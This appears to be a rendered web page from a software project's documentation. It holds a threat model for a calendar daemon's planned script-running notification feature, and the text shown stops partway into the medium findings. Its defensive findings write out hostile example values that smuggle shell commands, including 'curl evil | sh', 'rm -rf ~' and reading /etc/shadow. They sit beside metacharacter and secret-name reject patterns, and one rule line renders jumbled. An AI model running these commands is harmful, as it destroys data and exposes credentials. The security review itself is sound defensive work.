@@ -1,0 +1,862 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Recurring-event manager for Obsidian Full Calendar. Markdown as source of truth, server-expanded occurrences.">
+      
+      
+        <meta name="author" content="arch-err">
+      
+      
+        <link rel="canonical" href="https://arch-err.github.io/calemdar/security-reviews/notif-threat-model-2026-04-25/">
+      
+      
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
+    
+    
+      
+        <title>calemdar notification subsystem — pre-implementation threat model - calemdar</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.484c7ddc.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Inter:300,300i,400,400i,700,700i%7CJetBrains+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Inter";--md-code-font:"JetBrains Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="black" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#calemdar-notification-subsystem-pre-implementation-threat-model" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="calemdar" class="md-header__button md-logo" aria-label="calemdar" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            calemdar
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              calemdar notification subsystem — pre-implementation threat model
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="black" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/arch-err/calemdar" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M439.6 236.1 244 40.5c-5.4-5.5-12.8-8.5-20.4-8.5s-15 3-20.4 8.4L162.5 81l51.5 51.5c27.1-9.1 52.7 16.8 43.4 43.7l49.7 49.7c34.2-11.8 61.2 31 35.5 56.7-26.5 26.5-70.2-2.9-56-37.3L240.3 199v121.9c25.3 12.5 22.3 41.8 9.1 55-6.4 6.4-15.2 10.1-24.3 10.1s-17.8-3.6-24.3-10.1c-17.6-17.6-11.1-46.9 11.2-56v-123c-20.8-8.5-24.6-30.7-18.6-45L142.6 101 8.5 235.1C3 240.6 0 247.9 0 255.5s3 15 8.5 20.4l195.6 195.7c5.4 5.4 12.7 8.4 20.4 8.4s15-3 20.4-8.4l194.7-194.7c5.4-5.4 8.4-12.8 8.4-20.4s-3-15-8.4-20.4"/></svg>
+  </div>
+  <div class="md-source__repository">
+    arch-err/calemdar
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="calemdar" class="md-nav__button md-logo" aria-label="calemdar" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    calemdar
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/arch-err/calemdar" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M439.6 236.1 244 40.5c-5.4-5.5-12.8-8.5-20.4-8.5s-15 3-20.4 8.4L162.5 81l51.5 51.5c27.1-9.1 52.7 16.8 43.4 43.7l49.7 49.7c34.2-11.8 61.2 31 35.5 56.7-26.5 26.5-70.2-2.9-56-37.3L240.3 199v121.9c25.3 12.5 22.3 41.8 9.1 55-6.4 6.4-15.2 10.1-24.3 10.1s-17.8-3.6-24.3-10.1c-17.6-17.6-11.1-46.9 11.2-56v-123c-20.8-8.5-24.6-30.7-18.6-45L142.6 101 8.5 235.1C3 240.6 0 247.9 0 255.5s3 15 8.5 20.4l195.6 195.7c5.4 5.4 12.7 8.4 20.4 8.4s15-3 20.4-8.4l194.7-194.7c5.4-5.4 8.4-12.8 8.4-20.4s-3-15-8.4-20.4"/></svg>
+  </div>
+  <div class="md-source__repository">
+    arch-err/calemdar
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../quickstart/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Quickstart
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../configuration/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Configuration
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../cli/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CLI
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../architecture/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Architecture
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../schema/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Schema
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../design/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Design
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../faq/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    FAQ
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#executive-summary" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Executive summary
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#findings" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Findings
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Findings">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#critical" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Critical
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#high" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        High
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#medium" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Medium
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#low" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Low
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#informational" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Informational
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#surfaces-explicitly-out-of-scope-for-this-review" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Surfaces explicitly out of scope for this review
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#top-3-must-implement-before-v2-ships" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Top-3 must-implement before v2 ships
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#one-design-level-recommendation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        One design-level recommendation
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+  
+    <a href="https://github.com/arch-err/calemdar/edit/main/docs/security-reviews/notif-threat-model-2026-04-25.md" title="Edit this page" class="md-content__button md-icon" rel="edit">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M10 20H6V4h7v5h5v3.1l2-2V8l-6-6H6c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h4zm10.2-7c.1 0 .3.1.4.2l1.3 1.3c.2.2.2.6 0 .8l-1 1-2.1-2.1 1-1c.1-.1.2-.2.4-.2m0 3.9L14.1 23H12v-2.1l6.1-6.1z"/></svg>
+    </a>
+  
+  
+
+
+<h1 id="calemdar-notification-subsystem-pre-implementation-threat-model">calemdar notification subsystem — pre-implementation threat model<a class="headerlink" href="#calemdar-notification-subsystem-pre-implementation-threat-model" title="Permanent link">&para;</a></h1>
+<p>Commit: main @ <code>/home/archerr/Git/arch-err/Tools/calemdar</code> (pre-implementation; no notif-subsystem code yet)
+Scope: the upcoming multi-backend notification subsystem (system / libnotify, ntfy, extensible registry), per-event opt-in via frontmatter <code>notify:</code> arrays on events and recurring roots, configurable lead times, and an <strong>action runner</strong> that executes a script referenced in <code>notify.run</code>.
+Threat model: the daemon runs as <code>systemd --user</code> with full user privileges. Vault is on the user's laptop and <strong>syncthing-replicated to the user's other devices only</strong>. Anything in the vault therefore arrives from a peer that is, by trust definition, the user; but the threat surface widens compared to v1 because vault contents now drive <strong>executable side effects</strong>, not just file writes and an HTTP POST. The relevant adversaries:</p>
+<ol>
+<li><strong>Sync-channel compromise</strong> — a syncthing peer is misplaced, stolen, or malware-resident on a phone/tablet. Attacker writes a <code>.md</code> under <code>events/</code> or <code>recurring/</code>. Vault → laptop daemon → side effects.</li>
+<li><strong>Untrusted local writers</strong> — anything else on the laptop with write access to the vault dir (a misbehaving plugin in Obsidian, a leaked sync token in another tool, an editor that opens an attacker-supplied file in-place). Same blast radius as (1).</li>
+<li><strong>Self-foot-gun</strong> — the user pastes an event from an untrusted source (a calendar invite, a shared template) without reading it.</li>
+</ol>
+<p>All three converge on the same concrete primitive: <strong>arbitrary YAML in frontmatter must be assumed hostile</strong>, and arbitrary YAML can drive script execution. v1 had no such pathway — the worst a poisoned <code>.md</code> could do was distort the SQLite cache or push a confusing ntfy message. v2 adds an executable.</p>
+<h2 id="executive-summary">Executive summary<a class="headerlink" href="#executive-summary" title="Permanent link">&para;</a></h2>
+<p>The notif subsystem changes the daemon's worst-case capability from "writes to vault and POSTs HTTP" to <strong>arbitrary local code execution at user privilege level, triggered by file content</strong>. The single most important design decision is whether the action runner exists at all in v1, and if it does, what trust boundary gates it. The default-deny posture taken by the rest of the codebase (allowlists for calendars, regex on slugs, traversal checks on <code>base_path</code>) needs to extend cleanly here, or this subsystem becomes the path of least resistance for every other adversary in the model.</p>
+<p>There are <strong>2 critical, 3 high, 4 medium, 3 low, 2 informational</strong> findings below. Three guardrails are non-negotiable for v1: (a) <code>run</code> must be opt-in via a config-level kill switch, off by default; (b) <code>run</code> must execute via <code>exec.Command(path, args...)</code>, never via a shell, with arguments passed as discrete strings, not interpolated; (c) the resolved binary path must live inside an explicit allowlist directory (or pass an absolute-path + on-disk check) — vault content cannot smuggle in a fresh script via a relative path or a <code>~</code>/<code>$HOME</code> expansion.</p>
+<p>The trust-shape mismatch between syncthing peers (mobile, possibly compromised) and the daemon's privilege level is the <strong>design-level</strong> finding worth pausing on: a stolen phone with the syncthing token is currently equivalent to a remote shell on the laptop once notif <code>run</code> lands. Mitigating this purely in the daemon is hard; mitigating it by putting <code>run</code> behind a separate, manually-edited file outside the synced vault is easy and is the recommendation in C2 below.</p>
+<h2 id="findings">Findings<a class="headerlink" href="#findings" title="Permanent link">&para;</a></h2>
+<h3 id="critical">Critical<a class="headerlink" href="#critical" title="Permanent link">&para;</a></h3>
+<p><strong>C1 — <code>notify.run</code> from frontmatter is arbitrary user-privilege RCE driven by vault content.</strong>
+<em>Surface:</em> parsing of the <code>notify:</code> array on <code>Root</code> (<code>internal/model/root.go</code>) and <code>Event</code> (<code>internal/model/event.go</code>); whatever new spawn site lands in <code>internal/notify/</code> or a sibling.
+A <code>recurring/foo.md</code> with frontmatter:
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="nt">notify</span><span class="p">:</span>
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="w">  </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">lead</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">5m</span>
+<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="w">    </span><span class="nt">run</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">/tmp/x.sh</span>
+</code></pre></div>
+becomes a scheduled call to <code>/tmp/x.sh</code> on the user's laptop, fired by the user-level systemd unit. Anyone who can write to the vault — a syncthing peer (phone, tablet), a compromised Obsidian plugin, or a stolen second device — can drop this file and own the laptop. The current vault model treats the vault as user-trusted because the only side effects v1 produces are file writes and HTTP POSTs; that assumption breaks the moment <code>run</code> exists.
+<strong>Mitigation:</strong>
+- <strong>Default-off kill switch</strong> in <code>~/.config/calemdar/config.yaml</code>: <code>notifications.actions.enabled: false</code>. Document loudly in the README that turning this on widens the trust boundary to every device that holds the syncthing token.
+- <strong>Allowlist of script paths</strong>, not a free-form path. Concrete shape: <code>notifications.actions.allow:</code> is a list of absolute paths. At dispatch time, resolve <code>notify.run</code> to an absolute path with <code>filepath.Abs</code> and <code>filepath.EvalSymlinks</code>, then check exact membership in the allowlist. Reject anything else with a logged error and skip the notify entry. No globs, no prefix matching.
+- <strong>Optional but strongly recommended:</strong> the allowlist itself lives in <code>~/.config/calemdar/config.yaml</code>, <strong>outside the synced vault</strong>. A syncthing-side attacker cannot extend the allowlist; they can only point <code>run</code> at one of the user's pre-blessed scripts.
+- Log every spawn at INFO with <code>path</code>, <code>args</code>, <code>event-path</code>, <code>lead</code>, <code>pid</code>. Audit trail for the user, and a clear signal in the journal if something starts firing unexpectedly.</p>
+<p><strong>C2 — Frontmatter <code>run</code> field bypasses the v1 "vault is trusted because side effects are inert" assumption — design issue, not implementation.</strong>
+<em>Surface:</em> the design proposal itself.
+v1's design treats the vault as a low-stakes input because the daemon's outputs are file writes (to the same vault) and ntfy POSTs (HTTP, no arg-passing). Notifs introduce <strong>arg-passing from vault to spawn</strong>, which is qualitatively different. Even a perfect implementation of C1 leaves a usability footgun: every <code>recurring/&lt;x&gt;.md</code> is now an executable hook from the perspective of any peer device, and users will not reliably remember which events have a <code>run:</code> until something fires unexpectedly.
+<strong>Mitigation (design-level):</strong>
+- Consider moving <code>run:</code> <em>out</em> of the markdown file entirely. Two-file model: vault <code>recurring/foo.md</code> declares <code>notify: [{lead: 5m, action: pre-meeting}]</code> (an action <em>name</em>, not a script path); <code>~/.config/calemdar/actions.yaml</code> (un-synced) maps action names to script paths. The vault never carries an executable string. This is the cleanest separation: the synced surface is data, the unsynced surface is policy.
+- If shipping the inline <code>run:</code> form is non-negotiable, gate it behind an explicit per-file marker that the user must add manually (e.g. <code>notify-run-confirmed: true</code> next to <code>run:</code>, with the daemon refusing to spawn without it). Annoying, on purpose.
+- At minimum, document the trust-shape change in <code>docs/design.md</code> so the next reviewer/contributor sees the same warning.</p>
+<h3 id="high">High<a class="headerlink" href="#high" title="Permanent link">&para;</a></h3>
+<p><strong>H1 — Shell-metachar / interpreter abuse in <code>run</code>.</strong>
+<em>Surface:</em> spawn site (<code>internal/notify/run.go</code> or equivalent).
+A naive implementation that does <code>exec.Command("sh", "-c", entry.Run)</code> (or <code>bash -c</code>) makes every shell metacharacter live: <code>run: foo.sh; curl evil | sh</code>, <code>run: foo.sh &amp;&amp; rm -rf ~</code>, <code>run: $(cat /etc/shadow)</code>. Even without <code>sh -c</code>, <code>exec.Command(entry.Run)</code> with a single concatenated string is a surprise: Go's <code>exec.Command</code> does not re-tokenise, so <code>run: "/usr/bin/env bash -c 'curl evil'"</code> is treated as a binary literally named <code>/usr/bin/env bash -c 'curl evil'</code> (which fails) — the <em>real</em> trap is splitting <code>Fields(entry.Run)</code> and passing the head as the binary, which most implementations do.
+<strong>Mitigation:</strong>
+- Require <code>notify.run</code> to be a single absolute path string (no spaces, no flags). For arguments, use a separate <code>args:</code> list of strings.
+- Spawn via <code>exec.CommandContext(ctx, run, args...)</code>. Never pass user content as <code>sh -c</code> input. Never split by whitespace.
+- Reject <code>run</code> values matching: contains any of <code>;|&amp;$\</code>&lt;&gt;(){}[]*?#<sub>"'\<code>(yes,</code></sub><code>— no shell-style home expansion); contains a newline or carriage return; contains</code>..<code>; does not start with</code>/<code>; resolves outside the C1 allowlist after</code>EvalSymlinks<code>.
+- Validate</code>args<code>per element: each must be non-empty, must not contain</code>\x00`, must be ≤ 4 KiB. No argv splitting from a single string.</p>
+<p><strong>H2 — Path traversal / symlink swap on <code>run</code> allowlist.</strong>
+<em>Surface:</em> C1's allowlist resolution.
+<code>/home/user/bin/safe.sh</code> is on the allowlist; <code>/home/user/bin/safe.sh</code> is a symlink the attacker rewrote to <code>/tmp/evil.sh</code>. Or the allowlist contains <code>/home/user/bin/safe.sh</code> and the attacker creates <code>/home/user/bin/../bin/safe.sh</code> and an event references that exact string.
+<strong>Mitigation:</strong>
+- Always normalise: <code>abs, _ := filepath.Abs(entry.Run); resolved, _ := filepath.EvalSymlinks(abs)</code>. Compare <code>resolved</code> against allowlist entries that have themselves been pre-normalised at config-load time.
+- Reject if <code>EvalSymlinks</code> fails (means the file doesn't exist or is dangling — don't try to spawn it).
+- Refuse to spawn anything in a world-writable directory (<code>os.Stat</code> parent, check <code>mode &amp; 0o002</code>). <code>/tmp</code> is the obvious offender; surface it in the rejection log.
+- Refuse to spawn if the resolved file is itself world-writable or world-executable but owned by another user. <code>os.Stat</code> + uid check.</p>
+<p><strong>H3 — Env-var injection / template interpolation into spawned env or argv.</strong>
+<em>Surface:</em> whatever convenience-feature lets the user pass event metadata to the script (likely <code>args: ["{{.Title}}", "{{.StartTime}}"]</code> or <code>env: {EVENT_TITLE: "{{.Title}}"}</code>).
+The event title is user-content from a markdown file. If args/env support template substitution from the event:
+- A title containing a newline (<code>Foo\nBar</code>) injected into an env var becomes two env entries on some shells if the script later does <code>eval</code>, or breaks <code>$ENV_TITLE</code> parsing if the script <code>echo</code>s it into another tool.
+- A title containing <code>; rm -rf ~</code> is harmless argv-wise (Go's <code>exec.Cmd.Env</code> and <code>Args</code> are not re-tokenised) but becomes lethal if the script does <code>bash -c "echo $1"</code>. The vulnerability is downstream, but the daemon hands the loaded gun.
+- An event title with NUL bytes (<code>\x00</code>) gets truncated by some libc consumers — confusing rather than exploit-shaped, but a bug.
+<strong>Mitigation:</strong>
+- Strip / reject control characters (<code>\x00-\x08</code>, <code>\x0a-\x1f</code>, <code>\x7f</code>) in any string handed to the child process via env or argv. Concrete rule: pre-spawn, run each arg/env-value through a <code>regexp.MustCompile(</code>[\x00-\x1f\x7f]<code>).ReplaceAllString(s, " ")</code> and log if anything was substituted, so the user can see the source event.
+- Cap each arg/env-value at 4 KiB. Reject the whole spawn if any value exceeds that.
+- Document loudly: "scripts MUST treat all environment variables and arguments as untrusted user content. Do not eval them. Quote every variable expansion. Use <code>printf %s</code> not <code>echo</code>."
+- Pass event metadata via env, not argv, with a fixed prefix (<code>CALEMDAR_EVENT_TITLE=…</code>, <code>CALEMDAR_EVENT_DATE=…</code>) so the script's own argv isn't conflated with calendar data.</p>
+<h3 id="medium">Medium<a class="headerlink" href="#medium" title="Permanent link">&para;</a></h3>
+<p><strong>M1 — Backend secret leakage to spawned scripts via env.</strong>
+<em>Surface:</em> spawn site env construction.
+Go's <code>exec.Cmd.Env</code> defaults to the parent's env if nil. The daemon's parent env may contain <code>NTFY_TOKEN</code>, <code>NTFY_PASSWORD</code>, or other secrets the user exported into the systemd unit's <code>Environment=</code> directive (or, worse, into the URL via <code>https://user:pass@…</code>). A script spawned by the daemon inherits all of it.
+<strong>Mitigation:</strong>
+- Build the child env explicitly. Start from an empty <code>[]string{}</code>, add only what the script needs: <code>PATH</code>, <code>HOME</code>, <code>LANG</code>, <code>USER</code>, plus <code>CALEMDAR_*</code> event metadata. Drop everything else.
+- Specifically exclude any env var matching <code>(?i)(token|secret|password|key|auth)</code>, even from the curated set, as a belt-and-braces measure.
+- Never pass <code>n.cfg.NtfyURL</code> (which may carry basic-auth) into the child env. There is no legitimate reason for a notify-action script to know the ntfy URL.</p>
+<p><strong>M2 — Backend secret leakage to logs (extension of v1 M1).</strong>
+<em>Surface:</em> every log site that mentions a backend URL or token.
